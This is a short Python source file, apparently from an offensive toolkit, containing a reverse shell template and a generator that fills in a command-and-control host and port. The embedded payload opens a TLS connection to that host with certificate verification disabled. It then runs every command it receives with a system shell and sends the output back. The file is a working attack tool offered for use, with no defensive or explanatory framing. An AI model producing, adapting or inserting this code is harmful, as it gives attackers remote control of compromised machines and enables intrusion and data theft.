"""
reverse_shell.py
Standard reverse shell template — connects back to C2 over TCP/HTTPS.

Author: db88
"""

TEMPLATE = """
import socket
import subprocess
import ssl
import os

def connect(host, port, use_ssl=True):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    if use_ssl:
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        s = ctx.wrap_socket(s, server_hostname=host)
    s.connect((host, port))
    
    while True:
        cmd = s.recv(4096).decode("utf-8").strip()
        if cmd.lower() in ("exit", "quit"):
            break
        if cmd.lower().startswith("cd "):
            try:
                os.chdir(cmd[3:])
                s.send(b"OK\\n")
            except Exception as e:
                s.send(str(e).encode() + b"\\n")
            continue
        
        proc = subprocess.Popen(
            cmd, shell=True,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE
        )
        out = proc.stdout.read() + proc.stderr.read()
        s.send(out if out else b"(no output)\\n")
    
    s.close()

if __name__ == "__main__":
    connect("{callback}", {port})
"""

def generate(callback, port, protocol="https"):
    """Generate reverse shell payload with configured C2."""
    return TEMPLATE.format(
        callback=callback,
        port=port
    )
